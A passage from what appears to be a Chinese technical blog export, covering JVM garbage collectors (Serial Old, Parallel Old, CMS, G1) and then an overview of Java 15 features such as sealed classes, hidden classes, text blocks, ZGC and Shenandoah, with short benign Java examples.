Serial收集器的老年代版本，它同样是一个单线程收集器，使用“标记-整理”（Mark-Compact）算法。\n- 此收集器的主要意义也是在于给Client模式下的虚拟机使用。如果在Server模式下，它还有两大用途：\n- 在JDK1.5 以及之前版本（Parallel Old诞生以前）中与Parallel Scavenge收集器搭配使用。\n- 作为CMS收集器的后备预案，在并发收集发生Concurrent Mode Failure时使用。\n- 它的工作流程与Serial收集器相同，这里再次给出Serial/Serial Old配合使用的工作流程图：\n\n![29-18-06-gc-serial-old-xclu0t](https://up-img.yonghong.tech/pic/2021/07/29-18-06-gc-serial-old-xclu0t.png)\n\nParallel Old收集器\n- Parallel Old收集器是Parallel Scavenge收集器的老年代版本，使用多线程和“标记-整理”算法。前面已经提到过，这个收集器是在JDK 1.6中才开始提供的，在此之前，如果新生代选择了Parallel Scavenge收集器，老年代除了Serial Old以外别无选择，所以在Parallel Old诞生以后，“吞吐量优先”收集器终于有了比较名副其实的应用组合，在注重吞吐量以及CPU资源敏感的场合，都可以优先考虑Parallel Scavenge加Parallel Old收集器。Parallel Old收集器的工作流程与Parallel Scavenge相同，这里给出Parallel Scavenge/Parallel Old收集器配合使用的流程图：\n\n![29-18-06-gc-parallel-old-Weltva](https://up-img.yonghong.tech/pic/2021/07/29-18-06-gc-parallel-old-Weltva.png)\n\nCMS收集器\n- CMS（Concurrent Mark Sweep）收集器是一种以获取最短回收停顿时间为目标的收集器，它非常符合那些集中在互联网站或者B/S系统的服务端上的Java应用，这些应用都非常重视服务的响应速度。从名字上（“Mark Sweep”）就可以看出它是基于“标记-清除”算法实现的。\n- CMS收集器工作的整个流程分为以下4个步骤：\n  - 初始标记（CMS initial mark）：仅仅只是标记一下GC Roots能直接关联到的对象，速度很快，需要“Stop The World”。\n  - 并发标记（CMS concurrent mark）：进行GC Roots Tracing的过程，在整个过程中耗时最长。\n  - 重新标记（CMS remark）：为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间一般会比初始标记阶段稍长一些，但远比并发标记的时间短。此阶段也需要“Stop The World”。\n  - 并发清除（CMS concurrent sweep）\n- 由于整个过程中耗时最长的并发标记和并发清除过程收集器线程都可以与用户线程一起工作，所以，从总体上来说，CMS收集器的内存回收过程是与用户线程一起并发执行的。通过下图可以比较清楚地看到CMS收集器的运作步骤中并发和需要停顿的时间：\n\n![29-18-06-gc-cms-P2xUXk](https://up-img.yonghong.tech/pic/2021/07/29-18-06-gc-cms-P2xUXk.png)\n\n优点\n- CMS是一款优秀的收集器，它的主要优点在名字上已经体现出来了：并发收集、低停顿，因此CMS收集器也被称为并发低停顿收集器（Concurrent Low Pause Collector）。\n\n缺点\n- 对CPU资源非常敏感 其实，面向并发设计的程序都对CPU资源比较敏感。在并发阶段，它虽然不会导致用户线程停顿，但会因为占用了一部分线程（或者说CPU资源）而导致应用程序变慢，总吞吐量会降低。CMS默认启动的回收线程数是（CPU数量+3）/4，也就是当CPU在4个以上时，并发回收时垃圾收集线程不少于25%的CPU资源，并且随着CPU数量的增加而下降。但是当CPU不足4个时（比如2个），CMS对用户程序的影响就可能变得很大，如果本来CPU负载就比较大，还要分出一半的运算能力去执行收集器线程，就可能导致用户程序的执行速度忽然降低了50%，其实也让人无法接受。\n- 无法处理浮动垃圾（Floating Garbage） 可能出现“Concurrent Mode Failure”失败而导致另一次Full GC的产生。由于CMS并发清理阶段用户线程还在运行着，伴随程序运行自然就还会有新的垃圾不断产生。这一部分垃圾出现在标记过程之后，CMS无法再当次收集中处理掉它们，只好留待下一次GC时再清理掉。这一部分垃圾就被称为“浮动垃圾”。也是由于在垃圾收集阶段用户线程还需要运行，那也就还需要预留有足够的内存空间给用户线程使用，因此CMS收集器不能像其他收集器那样等到老年代几乎完全被填满了再进行收集，需要预留一部分空间提供并发收集时的程序运作使用。\n- 标记-清除算法导致的空间碎片 CMS是一款基于“标记-清除”算法实现的收集器，这意味着收集结束时会有大量空间碎片产生。空间碎片过多时，将会给大对象分配带来很大麻烦，往往出现老年代空间剩余，但无法找到足够大连续空间来分配当前对象。\n\nG1收集器\n- G1（Garbage-First）收集器是当今收集器技术发展最前沿的成果之一，它是一款面向服务端应用的垃圾收集器，HotSpot开发团队赋予它的使命是（在比较长期的）未来可以替换掉JDK 1.5中发布的CMS收集器。与其他GC收集器相比，G1具备如下特点：\n  - 并行与并发 G1 能充分利用多CPU、多核环境下的硬件优势，使用多个CPU来缩短“Stop The World”停顿时间，部分其他收集器原本需要停顿Java线程执行的GC动作，G1收集器仍然可以通过并发的方式让Java程序继续执行。\n  - 分代收集 与其他收集器一样，分代概念在G1中依然得以保留。虽然G1可以不需要其他收集器配合就能独立管理整个GC堆，但它能够采用不同方式去处理新创建的对象和已存活一段时间、熬过多次GC的旧对象来获取更好的收集效果。\n  - 空间整合 G1从整体来看是基于“标记-整理”算法实现的收集器，从局部（两个Region之间）上来看是基于“复制”算法实现的。这意味着G1运行期间不会产生内存空间碎片，收集后能提供规整的可用内存。此特性有利于程序长时间运行，分配大对象时不会因为无法找到连续内存空间而提前触发下一次GC。\n  - 可预测的停顿 这是G1相对CMS的一大优势，降低停顿时间是G1和CMS共同的关注点，但G1除了降低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个长度为M毫秒的时间片段内，消耗在GC上的时间不得超过N毫秒，这几乎已经是实时Java（RTSJ）的垃圾收集器的特征了。\n\n横跨整个堆内存\n\n- 在G1之前的其他收集器进行收集的范围都是整个新生代或者老生代，而G1不再是这样。G1在使用时，Java堆的内存布局与其他收集器有很大区别，它将整个Java堆划分为多个大小相等的独立区域（Region），虽然还保留新生代和老年代的概念，但新生代和老年代不再是物理隔离的了，而都是一部分Region（不需要连续）的集合。\n\n建立可预测的时间模型\n\n- G1收集器之所以能建立可预测的停顿时间模型，是因为它可以有计划地避免在整个Java堆中进行全区域的垃圾收集。G1跟踪各个Region里面的垃圾堆积的价值大小（回收所获得的空间大小以及回收所需时间的经验值），在后台维护一个优先列表，每次根据允许的收集时间，优先回收价值最大的Region（这也就是Garbage-First名称的来由）。这种使用Region划分内存空间以及有优先级的区域回收方式，保证了G1收集器在有限的时间内可以获取尽可能高的收集效率。\n\n避免全堆扫描——Remembered Set\n\n- G1把Java堆分为多个Region，就是“化整为零”。但是Region不可能是孤立的，一个对象分配在某个Region中，可以与整个Java堆任意的对象发生引用关系。在做可达性分析确定对象是否存活的时候，需要扫描整个Java堆才能保证准确性，这显然是对GC效率的极大伤害。\n\n- 为了避免全堆扫描的发生，虚拟机为G1中每个Region维护了一个与之对应的Remembered Set。虚拟机发现程序在对Reference类型的数据进行写操作时，会产生一个Write Barrier暂时中断写操作，检查Reference引用的对象是否处于不同的Region之中（在分代的例子中就是检查是否老年代中的对象引用了新生代中的对象），如果是，便通过CardTable把相关引用信息记录到被引用对象所属的Region的Remembered Set之中。当进行内存回收时，在GC根节点的枚举范围中加入Remembered Set即可保证不对全堆扫描也不会有遗漏。\n\n\n如果不计算维护Remembered Set的操作，G1收集器的运作大致可划分为以下几个步骤：\n\n- 初始标记（Initial Marking） 仅仅只是标记一下GC Roots 能直接关联到的对象，并且修改TAMS（Nest Top Mark Start）的值，让下一阶段用户程序并发运行时，能在正确可以的Region中创建对象，此阶段需要停顿线程，但耗时很短。\n- 并发标记（Concurrent Marking） 从GC Root 开始对堆中对象进行可达性分析，找到存活对象，此阶段耗时较长，但可与用户程序并发执行。\n- 最终标记（Final Marking） 为了修正在并发标记期间因用户程序继续运作而导致标记产生变动的那一部分标记记录，虚拟机将这段时间对象变化记录在线程的Remembered Set Logs里面，最终标记阶段需要把Remembered Set Logs的数据合并到Remembered Set中，这阶段需要停顿线程，但是可并行执行。\n- 筛选回收（Live Data Counting and Evacuation） 首先对各个Region中的回收价值和成本进行排序，根据用户所期望的GC 停顿是时间来制定回收计划。此阶段其实也可以做到与用户程序一起并发执行，但是因为只回收一部分Region，时间是用户可控制的，而且停顿用户线程将大幅度提高收集效率。\n\n通过下图可以比较清楚地看到G1收集器的运作步骤中并发和需要停顿的阶段（Safepoint处）：\n\n![29-18-07-gc-g1-8jiIgU](https://up-img.yonghong.tech/pic/2021/07/29-18-07-gc-g1-8jiIgU.png)\n\n#### 总结\n\n| 收集器                | 串行、并行or并发 | 新生代/老年代 | 算法               | 目标         | 适用场景                                  |\n| --------------------- | ---------------- | ------------- | ------------------ | ------------ | ----------------------------------------- |\n| **Serial**            | 串行             | 新生代        | 复制算法           | 响应速度优先 | 单CPU环境下的Client模式                   |\n| **Serial Old**        | 串行             | 老年代        | 标记-整理          | 响应速度优先 | 单CPU环境下的Client模式、CMS的后备预案    |\n| **ParNew**            | 并行             | 新生代        | 复制算法           | 响应速度优先 | 多CPU环境时在Server模式下与CMS配合        |\n| **Parallel Scavenge** | 并行             | 新生代        | 复制算法           | 吞吐量优先   | 在后台运算而不需要太多交互的任务          |\n| **Parallel Old**      | 并行             | 老年代        | 标记-整理          | 吞吐量优先   | 在后台运算而不需要太多交互的任务          |\n| **CMS**               | 并发             | 老年代        | 标记-清除          | 响应速度优先 | 集中在互联网站或B/S系统服务端上的Java应用 |\n| **G1**                | 并发             | both          | 标记-整理+复制算法 | 响应速度优先 | 面向服务端应用，将来替换CMS               |\n\n---","categories":["java"],"tags":["java"]},{"title":"JDK 15来袭，带你深入掌握 Java 15 新特性","url":"/2020/12/jdk-15-new-feature/","content":"\n视频来源：https://www.bilibili.com/video/BV1vf4y1B7tt\n\n## 大背景\n\n### 25 岁的 Java\n\n#### Java 的现状\n2020 年是 Java 诞生的第 25 个年头，Oracle 表示，目前 Java 仍然流行是流行的编程语言，广泛使用在企业中。目前全世界有超过 69% 的专职开发人员使用 Java，全世界有 510 亿台活动 Java 虚拟机（JVM）在部署中，目前 Java 主要被用于分析、数据管理、大数据、DevOps、移动、持续开发工具和聊天机器人等服务。\n\n#### 历史版本的主要新特性\n在过去的这些年中，Java 在过去增强功能的推动下为用户提供了超过二十年的创新。例如：\n- JDK 5：enum、泛型、自动装箱与拆箱、可变参数、增强循环等\n- JDK 6：支持脚本语言、JDBC 4.0 API\n- JDK 7：支持 try-with-resources、switch 语句块增加 String 支持、NIO 2.0 包\n- JDK 8：lambda 表达式、Stream API、新的日期时间的 API、方法引用、构造器引用\n- JDK 9：模块化系统、jshell\n- JDK 10：局部变量的类型推断\n- JDK 11：ZGC 的引入、Epsilon GC\n- JDK 12：switch 表达式、Shenandoah GC、增强 G1\n- JDK 13：switch 表达式引入 yield、文本块\n- JDK 14：instanceof 模式识别、Records、弃用 Parallel Scavenge + Serial GC 组合、删除 CMS GC\n\n<!-- more -->\n\n#### 近期版本发布及维护时间\n\nOpenJDK 发版本路线图：\n\n![OpenJDK 发版本路线图](https://up-img.yonghong.tech/pic/2020/12/10-09-20-lKGMjQBUu1XzDeP-96MbI6.jpg)\n\nOracle Java SE 支持路线图：https://www.oracle.com/java/technologies/java-se-support-roadmap.html\n\n![Oracle Java SE 支持路线图](https://up-img.yonghong.tech/pic/2020/12/10-09-20-Oracle-Java-SE-%E6%94%AF%E6%8C%81%E8%B7%AF%E7%BA%BF%E5%9B%BE-Bwu1zb.png)\n\n### 名词解释\n\n因为是小步快跑、快速迭代，因此此处解释下这两个词：孵化器模块（Incubator）和预览特性（Preview）。\n\n#### 孵化器模块（Incubator/孵化版/实验版）\n\n尚未确定的 API/工具，主要用于从 Java 社区收集使用反馈，稳定性无保障，后期有较大可能性移除。\n\n#### 预览特性（Preview/预览版）\n\n规格已成型，实现已确定，但还未最终定稿。这些特性还是存在被移除的可能性，但一般来说最后都会被固定下来。\n\n### 新特性关注点\n\n角度一：语法层面\n\nlambda 表达式、switch、自动装箱和拆箱、enum、接口中的静态方法、默认方法、私有方法\n\n角度二：API 层面\n\nStream API、新的日期时间的 API、Optional、String、集合框架\n\n角度三：底层优化\n\nJVM 优化、元空间、GC、GC 的组合、GC 的参数、js 的执行引擎、集合底层实现等\n\n## 新特性概述\n\n### 主要功能\n\n这次发布的主要功能有：\n\nJava 15 为用户提供了 14 项主要的增强/更改,包括一个孵化器模块、三个预览功能、两个不推荐使用的功能以及两个删除功能。\n\nhttps://openjdk.java.net/projects/jdk/15/\n\n**Features**\n\n- 339:  [Edwards-Curve Digital Signature Algorithm (EdDSA)](https://openjdk.java.net/jeps/339) \n- 360:  [Sealed Classes (Preview)](https://openjdk.java.net/jeps/360) \n- 371:  [Hidden Classes](https://openjdk.java.net/jeps/371)          \n- 372:  [Remove the Nashorn JavaScript Engine](https://openjdk.java.net/jeps/372) \n- 373:  [Reimplement the Legacy DatagramSocket API](https://openjdk.java.net/jeps/373) \n- 374:  [Disable and Deprecate Biased Locking](https://openjdk.java.net/jeps/374) \n- 375:  [Pattern Matching for instanceof (Second Preview)](https://openjdk.java.net/jeps/375) \n- 377:  [ZGC: A Scalable Low-Latency Garbage Collector](https://openjdk.java.net/jeps/377) \n- 378:  [Text Blocks](https://openjdk.java.net/jeps/378)             \n- 379:  [Shenandoah: A Low-Pause-Time Garbage Collector](https://openjdk.java.net/jeps/379) \n- 381:  [Remove the Solaris and SPARC Ports](https://openjdk.java.net/jeps/381) \n- 383:  [Foreign-Memory Access API (Second Incubator)](https://openjdk.java.net/jeps/383) \n- 384:  [Records (Second Preview)](https://openjdk.java.net/jeps/384) \n- 385:  [Deprecate RMI Activation for Removal](https://openjdk.java.net/jeps/385) \n\n对应中文特性：（JEP：JDK Enhancement Proposals，JDK 增强建议，也就是 JDK 的特性新增和改进提案。）\n\n- JEP 339：EdDSA 数字签名算法\n- JEP 360：密封类（预览）\n- JEP 371：隐藏类\n- JEP 372：删除 Nashorn JavaScript 引擎\n- JEP 373：重新实现 Legacy DatagramSocket API\n- JEP 374：禁用偏向锁\n- JEP 375：instanceof 模式匹配（第二次预览）\n- JEP 377：ZGC：一个可扩展的低延迟垃圾收集器\n- JEP 378：文本块\n- JEP 379：Shenandoah：低暂停时间垃圾收集器\n- JEP 381：移除 Solaris 和 SPARC 端口\n- JEP 383：外部存储器访问 API（第二个孵化版）\n- JEP 384：Records（第二次预览）\n- JEP 385：废弃 RMI 激活机制\n\n总结：\n- JDK 15 整体来看新特性方面并不算很亮眼，它主要是对之前版本预览特性的功能做了确定，如文本块、ZGC 等，这么一来我们就可以放心大胆的使用了。\n- 你发任你发，我用 Java 8。\n\n### 做出贡献的企业\n\n通过 Oracle 的官方博文中看到，虽然主力军 Oracle 干了 79.68% 的工作量，其次是开源巨头红帽。但还是有不少企业参与其中。国内企业贡献最多的居然是腾讯公司，被 Oracle 点名感谢。阿里巴巴和华为也做出了不可磨灭的贡献。Java 有中国科技力量的贡献能大大提升中国 IT 的硬实力。\n\n### 开发工具\n\n支持 Java 15 的开发工具\n\n目前，官方博文说支持 Java 15 的工具，就下面这三款：\n- JetBrains IDEA\n- Apache NetBeans\n- Eclipse Marketplace\n\n运行 JDK 15 需要 IDEA 2020.2 才能支持。（JDK 14 要求 2020.1）\n\nJDK 15 下载路径：\n\nhttps://www.oracle.com/java/technologies/javase/jdk15-archive-downloads.html\n\n如果使用 IDEA 需要设置 Project Structure -> Project -> Project language level 为 15 （Preview ...）\n\n如果使用 Gradle，还需配置 build.gradle\n\n```gradle\n// 开启预览特性\ntasks.withType(JavaCompile) {\n    options.compilerArgs += \"--enable-preview\"\n}\n```\n\n## 新特性（主菜）\n\n### 01-密封类\n\n**JEP 360: Sealed Classes(Preview) 密封的类和接口（预览）**\n\n通过密封的类和接口来增强 Java 编程语言，这是新的预览特性。\n\n用于限制超类的使用，密封的类和接口限制其它可能继承或实现它们的其他类或接口。\n\n这个特性的目标包括——允许类或接口的开发者来控制哪些代码负责实现，提供了比限制使用超类的访问修饰符声明方式更多的选择，并通过支持对模式的详尽分析而支持模式匹配的未来发展。\n\n在 Java 中，类层次结构通过继承实现代码的重用，父类的方法可以被许多子类继承。\n\n但是，类层次结构的目的并不总是重用代码。有时，其目的是对域中存在的各种可能性进行建模，例如图形库支持的形状类型或金融应用程序支持的贷款类型。当以这种方式使用类层次结构时，我们可能需要限制子类集从而来简化建模。\n\n具体使用：\n\n因为我们引入了 sealed class 或 interface。这些 class 或者 interface 只允许被指定的类或者 interface 进行拓展和实现。\n\n使用修饰符 sealed class 或 interface，这些 class 或者 interface 只允许被指定的类或者 interface 进行拓展和实现。\n\n使用修饰符 sealed，您可以将一个类声明为密封类。密封类使用 reserved 关键字 permits 列出可以直接拓展它的类。子类可以是最终的，非密封的或密封的。\n\n示例：\n\n```java\npublic sealed class Person permits Teacher, Student, Worker { // 人\n}\n\nfinal class Teacher extends Person { // 教师\n}\n\nsealed class Student extends Person permits MiddleSchoolStudent, GraduateStudent { // 学生\n}\n\nfinal class MiddleSchoolStudent extends Student { // 中学生\n}\n\nfinal class GraduateStudent extends Student { // 研究生\n}\n\nnon-sealed class Worker extends Person { // 工人\n}\n\nclass RailWayWorker extends Worker { // 铁路工人\n}\n```\n\n### 02-隐藏类\n\n**JEP 371: Hidden Classes（隐藏类）**\n\n该提案通过启用标准 API 来定义**无法发现**且**具有有限生命周期**的隐藏类，从而提高 JVM 上所有语言的效率。JDK 内部和外部的框架将能够动态生成类，而这些类可以定义隐藏类。通常来说基于 JVM 的很多语言都有动态生成类的机制，这样可以提高语言的灵活性和效率。\n- 隐藏类天生为框架设计的，在运行时生成内部的 class。\n- 隐藏类只能通过反射访问，不能直接被其他类的字节码访问。\n- 隐藏类可以独立于其他类加载、卸载，这可以减少框架的内存占用。\n\n**Hidden Classes 是什么呢？**\nHidden Classes 就是不能直接被其他 class 的二进制代码使用的 class。Hidden Classes 主要被一些框架用来生成运行时类，但是这些类不是用来直接使用的，而是通过反射机制来调用。\n\n比如在 JDK 8 中引入的 lambda 表达式，JVM 并不会在编译的时候将 lambda 表达式转换成为专门的类，而是在运行时将相应的字节码动态生成相应的类对象。\n\n另外使用动态代理也可以为某些类生成新的动态类。\n\n**那么我们希望这些动态生成的类需要具有什么特性呢？**\n- **不可发现性。**因为我们是为某些静态的类动态生成的动态类，所以我们希望把这个动态生成的类看做是静态类的一部分。所以我们不希望除了该静态类之外的其他机制发现。\n- **访问控制。**我们希望在访问控制静态类的同时，也能控制到动态生成的类。\n- **生命周期。**动态生成类的生命周期一般都比较短，我们并不需要将其保存和静态类的生命周期一致。\n\n**API 的支持**\n所以我们需要一些 API 来定义无法发现的且具有有限生命周期的隐藏类。这将提高所有基于 JVM 的语言实现的效率。比如：\n- java.lang.reflect.Proxy 可以定义隐藏类作为实现代理接口的代理类。\n- java.lang.invoke.StringConcatFactory 可以生成隐藏类来保存常量连接的方法。\n- java.lang.invoke.LambdaMetaFactory 可以生成隐藏的 nestmate 类，以容纳访问封闭变量的 lambda 主体。\n\n普通类是通过调用 ClassLoader::defineClass 创建的，而隐藏来是通过调用 Lookup::defineHiddenClass 创建的。这使 JVM 从提供的字节中派生一个隐藏类，链接该隐藏类，并返回提供对隐藏类的反射访问的查找对象。调用程序可以通过返回的查找对象来获取隐藏类的 Class 对象。\n\n### 03-instanceof 模式匹配\n\n**JEP 375: Pattern Matching for instanceof(Second Preview) instanceof 自动匹配模式**\n\n在 Java 14 中作为预览语言功能引入的 instanceof 模式匹配，在 Java 15 中处于第二次预览，而没有任何更改。\n\n模式匹配允许程序中的通用逻辑（主要是从对象中的条件提取组件）可以更简洁地表达，Haskell 和 C# 等语言已采用模式匹配来实现简洁和安全性。\n\n示例：\n\n```java\npublic class InstanceofTest {\n\n    public static void test1(Object obj) {\n        if (obj instanceof String) {\n            String str = (String) obj;\n            System.out.println(str.contains(\"Java\"));\n        } else {\n            System.out.println(\"Not String Type\");\n        }\n    }\n\n    public static void test2(Object obj) {\n        if (obj instanceof String str) {\n            System.out.println(str.contains(\"Java\"));\n        } else {\n            System.out.println(\"Not String Type\");\n        }\n    }\n\n    public static void main(String[] args) {\n        test1(\"Hello, Java\");\n        test2(\"Hello, Java\");\n        test1(null);\n        test2(null);\n    }\n}\n```\n\n\n### 04-ZGC 功能转正\n\n**JEP 377: ZGC: A Scalable Low-Latency Garbage Collector(Production) ZGC 功能转正**\n\nZGC 是 Java 11 引入的新的垃圾收集器（JDK 9 以后默认的垃圾收集器是 G1），经过了多个实验阶段，自此终于成为正式特性。\n\n自 2018 年以来，ZGC 已增加了许多改进，从并发类卸载、取消使用未使用的内存、对类数据共享的支持到改进的 NUMA 感知。此外，最大堆大小从 4 TB 增加到 16 TB。支持的平台包括 Linux、Windows 和 macOS。\n\nZGC 是一个重新设计的并发的垃圾回收器，通过减少 GC 停顿时间来提高性能。\n\n但这并不是替换默认的 GC，默认的 GC 仍然还是 G1；之前需要通过 `-XX:+UnlockExperimentalVMOptions`, `-XX:+UseZGC` 来启用 ZGC，现在只需要 `-XX:+UseZGC` 就可以。相信不久的将来它必将成为默认的垃圾回收器。\n\n相关的参数有 ZAllocationSpikeTolerance、ZCollectionInterval、ZFragmentationLimit、ZMarkStackSpaceLimit、ZProactive、ZUncommit、ZUncommitDelay、ZAllocationStall、ZPageAllocation、ZPageCacheFlush、ZRelocationSet、ZRelocationSetGroup、ZUncommit。\n\n\n### 05-文本块功能转正\n\n**JEP 378: 文本块功能转正**\n\nText Blocks 首次是在 JDK 13 中以预览功能出现的，然后在 JDK 14 中又预览了一次，终于在 JDK 15 中被确定下来，可以放心使用了。\n\n文本块是一种多行字符串文字，它避免了大多数转义序列的需要，以一种可预测的方式自动设置字符串的格式，并在需要时使开发人员可以控制格式，简化编写 Java 程序的任务。\n\n文本块建议的目标是提高 Java 程序中的字符串的可读性，这些字符串便是以非 Java 语言编写的代码。另一个目标是支持从字符串文本迁移，规定任何新构造都可以表达与字符串文本相同的字符串集，解释相同的转义序列，并且以与字符串文本相同的方式进行操作。OpenJDK 开发人员希望添加转义序列来管理显式空白和换行控件。\n\n示例：\n\n```java\npublic class TextBlockTest {\n\n    public static void main(String[] args) {\n        String text = \"\"\"\n                The Sound of Silence\n                寂静之声\n                Hello darkness, my old friend\n                你好 黑暗 我的老朋友\n                I've come to talk with you again\n                我又来和你交谈\n                Because a vision softly creeping\n                因为有一种幻觉正向悄悄地向我袭来\n                Left its seeds while I was sleeping\n                在我熟睡的时候留下了它的种子\n                And the vision that was planted in my brain\n                这种幻觉在我的脑海里生根发芽\n                Still remains\n                缠绕着我\n                Within the sound of silence 取消换行 \\\n                伴随着寂静的声音\\s空格\n                \"\"\";\n        System.out.println(text);\n    }\n}\n```\n\n### 06-Records\n\n**JEP 384: Records Class（预览）**\n\nRecords Class 也是第二次出现的预览功能，它在 JDK 14 中也出现过一次了，使用 Record 可以更方便的创建一个常量类，使用的前后代码对比如下。\n- 当你用 Record 声明一个类时，该类将自动拥有以下功能：\n  - 获取成员变量的简单方法，以上面的代码为例 name() 和 partner()。注意区分于我们平常 getter 的写法。\n  - 一个 equals 方法的实现，执行比较时会比较该类的所有成员属性。\n  - 重写 equals 当然要重写 hashCode。\n  - 一个可以打印该类所有成员属性的 toString 方法。\n  - 请注意只会有一个构造方法。\n\n\n## 新特性（配菜）\n\n### 01-EdDSA 数字签名算法\n\n**JEP 339: Edwards-Curve Digital Signature Algorithm（EdDSA 数字签名算法）**\n\n这是一个新的功能。新加入基于 Edwards-Curve 数字签名算法（Edwards-Curve Digital Signature Algorithm）的加密签名，即爱德华兹曲线数字签名算法。\n\n与 JDK 中的现有签名方案相比，EdDSA 具有更高的安全性和性能，因此备受关注。它已经在 OpenSSL 和 BoringSSL 等加密库中得到支持，在区块链领域用的比较多。\n\nEdDSA 是一种现代的椭圆曲线方案，具有 JDK 中现有签名方案的优点。\n\n### 02-重新实现 DatagramSocket API\n\n**JEP 373: Reimplement the Legacy DatagramSocket API（重新实现 DatagramSocket API）**\n\n新的计划是 JEP 353 的后续，该方案重新实现了遗留的套接字 API。\n\njava.net.datagram.Socket 和 java.net.MulticastSocket 的当前实现可以追溯到 JDK 1.0，那时 IPv6 还在开发中。因此，当前的多播套接字实现尝试调和 IPv4 和 IPv6 难以维护的方式。\n\n- 通过替换 java.net.datagram 的基础实现，重新实现旧版 DatagramSocket API。\n- 更改 java.net.DatagramSocket 和 java.net.MulticastSocket 为更加简单、现代化的底层实现。提高了 JDK 的可维护性和稳定性。\n\n新的实现：\n- 易于调试和维护\n- 与 Project Loom 中正在探索的虚拟线程协同\n\n### 03-禁用偏向锁\n\n**JEP 374: Disable and Deprecate Biased Locking 禁用偏向锁定**\n\n在默认情况下禁用偏向锁定，并弃用所有相关命令行选项。目标是确定是否需要继续支持偏置锁定的高维护成本的遗留同步优化，**HotSpot 虚拟机使用该优化来减少非竞争锁定的开销**。尽管某些 Java 应用程序在禁用偏向锁后可能会出现性能下降，但偏向锁的性能提高通常不像以前那么明显。\n\n### 04-Shenandoah GC 转正\n\nShenandoah 垃圾回收算法终于从实验特性转变为产品特性，这是一个从 JDK 12 引入的回收算法，该算法通过与正在运行的 Java 线程同时进行疏散工作来减少 GC 暂停时间。Shenandoah 的暂停时间与堆大小无关，无论堆大小是 200 MB 还是 200 GB，都具有相同的一致暂停时间。\n\n怎么形容 Shenandoah GC 和 ZGC 的关系呢？异同点大概如下：\n- 相同点：性能几乎可以认为是相同的。\n- 不同的：ZGC 是 Oracle JDK 的，根正苗红。而 Shenandoah 只存在于 OpenJDK 中，因此使用时需要注意你的 JDK 版本。\n\n打开方式：使用 `-XX:+UseShenandoahGC` 命令行参数打开。\n\n### 05-外部存储器访问 API\n\n**JEP 383: Foreign-Memory Access API(Second Incubator) 外部存储器访问 API（孵化器版）**\n\n目的是引入一个 API，以允许 Java 程序安全、有效地访问 Java 堆之外的外部存储器。如本机、持久和托管堆。\n\n有许多 Java 程序是访问外部内存的，比如 Ignite 和 MapDB。该 API 将有助于避免与垃圾收集相关的成本以及与跨进程共享内存以及通过将文件映射到内存来序列化和反序列化内存内容相关的不可预测性。该 Java API 目前没有为访问外部存储内存提供令人满意的解决方案。但是在新的提议中，API 不应该破化 JVM 的安全性。\n\nForeign-Memory Access API 在 JDK 14 被作为 Incubator API 引入，在 JDK 15 处于 Second Incubator，提供了改进。\n\n### 06-移除 Solaris 和 SPARC 端口\n\n**JEP 381: Remove the Solaris and SPARC Ports（移除 Solaris 和 SPARC 端口）**\n\n删除对 Solaris/SPARC、Solaris/x64 和 Linux/SPARC 端口的源代码和构建支持，在 JDK 14 中被标记为废弃，在 JDK 15 版本正式移除。\n\n许多正在开发的项目和功能（如 Valhalla、Loom 和 Panama）需要进行重大更改以适应 CPU 架构和操作系统特定代码。\n\n近年来，Solaris 和 SPARC 都已被 Linux 操作系统和英特尔处理器取代。放弃对 Solaris 和 SPARC 端口的支持将使 OpenJDK 社区的贡献者能够加速开发新功能，从而推动平台向前发展。\n\n### 07-移除 the Nashorn JS 引擎\n\n**JEP 372: Remove the Nashorn JavaScript Engine**\n\nNashorn 是在 JDK 提出的脚本执行引擎，该功能是 2014 年 3 月发布的 JDK 8 的新特性。在 JDK 11 就已经把它标记为废弃了，JDK 15 完全移除。\n\n在 JDK 11 中取以代之的是 GraalVM。GraalVM 是一个运行时平台，它支持 Java 和其他基于 Java 字节码的语言，但也支持其他语言，如 JavaScript，Ruby，Python 或 LLVM。性能是 Nashorn 的 2 倍以上。\n\nJDK 15 移除了 Nashorn JavaScript Engine 及 jjs 命令行工具。具体就是 jdk.scripting.nashorn 及 jdk.scripting.nashorn.shell 这两个模块被移除了。\n\n补充：\n\n![Graal VM](https://up-img.yonghong.tech/pic/2020/12/10-09-20-graalvm-e6kACA.png)\n\nGraal VM 在 HotSpot VM 基础上增强而成的跨语言全栈虚拟机，可以作为“任何语言”的运行平台使用。语言包括：Java、Scala、Groovy、Kotlin、C、C++、JavaScript、Ruby、Python、R等\n\n### 08-废弃 RMI 激活机制\n\n**JEP: Deprecate RMI Activation for Removal**\n\nRMI Activation 被标记为 Deprecate，将会在未来的版本中删除。RMI 激活机制是 RMI 中一个过时的部分，自 Java 8 以来一直是可选的而非必选项。RMI 激活机制增加了持续的维护负担。RMI 的其他部分暂时不会被弃用。\n\n在 RMI 系统中，我们使用延迟激活。延迟激活将激活对象推迟到客户第一次使用（即第一次方法调用）之前。\n\n既然 RMI Activation 这么好用，为什么要废弃呢？\n\n因为对于现代应用程序来说，分布式系统大部分都是基于 Web 的，Web 服务器已经解决了穿越防火墙，过滤请求，身份验证和安全性的问题，并且也提供了很多延迟加载的技术。\n\n所以在现代应用程序中，RMI Activation 已经很少被使用到了。并且在各种开源代码库中，也基本上找不到 RMI Activation 的使用代码了。\n\n为了减少 RMI Activation 的维护成本，在 JDK 8 中，RMI Activation 被置为可选的。现在在 JDK 15，终于可以废弃了。\n\n## 新特性（饭后甜点）\n\n### 01-添加项\n\n- 升级了 Unicode，支持 Unicode 13\n- 给 CharSequence 新增了 isEmpty 方法\n- JDK 15 对 TreeMap 提供了 putIfAbsent、computeIfAbsent、computeIfPresent、compute、merge 方法提供了 overriding 实现\n- jcmd 的 GC.heap_dump 命令现在支持 gz 选项，以 dump 出 gzip 压缩版的 heap。压缩等级从 1（压缩快） 到 9（压缩慢），默认为1。\n- jdk.net.ExtendedSocketOptions 新增 SO_INCOMING_NAPI_ID 选项\n- 新增 jdk.tls.client.SignatureSchemes 及 jdk.tls.server.SignatureSchemes 用于配置 TLS Signature Schemes\n- 支持 certificate_authorities\n\n### 02-移除项&废弃项\n- 淘汰了 `-XX:UseAdaptiveGCBoundary`\n- 废弃了 ForceNUMA 选项\n- 默认禁用了 Native SunEC Implementation\n\n\n### 03-其他事项\n\n已知问题：\n- HttpClient 现在没有覆盖在 SSLContext Default Parameters 中指定的 Protocols\n\n其他事项：\n- 当 DatagramPacket 没有设置 port 的时候，其 getPort 方法返回 0\n- 优化了默认 G1 Heap Region Size 